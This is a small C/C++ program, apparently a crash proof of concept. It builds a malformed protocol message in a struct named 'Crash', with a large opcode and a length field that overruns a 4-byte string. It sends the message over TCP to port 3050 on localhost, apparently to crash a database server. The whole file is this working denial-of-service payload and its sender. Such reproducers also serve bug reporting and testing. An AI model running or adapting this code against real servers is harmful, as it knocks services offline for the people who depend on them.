#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <string.h>
#include <stdio.h>

struct Crash
{
	static const int N = 100;

	int	op_resp;
	int	r_object;
	int	r_blob[2];
	int ls;
	char r_str[4];
	int r_vector[1024];

	Crash()
	{
		op_resp = 0x9000000;
		r_object = 0;
		r_blob[1] = r_blob[0] = 0;
		ls = 0x200;
		r_str[0] = '1';
		r_str[1] = '2';
		r_str[2] = '1';
		r_str[3] = '2';
		for (int i = 0; i < N; ++i) r_vector[i] = 1;
	}
};

int main()
{
	Crash crash;
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;   /* Datagram socket */

	int s = getaddrinfo("localhost", "3050", &hints, &result);
	if (s != 0) {
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
		return 1;
	}

	for (rp = result; rp != NULL; rp = rp->ai_next)
	{
		int sfd = socket(rp->ai_family, rp->ai_socktype, 
rp->ai_protocol);
		if (sfd == -1)
		{
			perror("socket");
			continue;
		}
		if (connect(sfd, rp->ai_addr, rp->ai_addrlen) != -1)
		{
			send(sfd, &crash, sizeof(crash), 0);
			return 0;
		}
		perror("connect");
	}

	return 1;
}

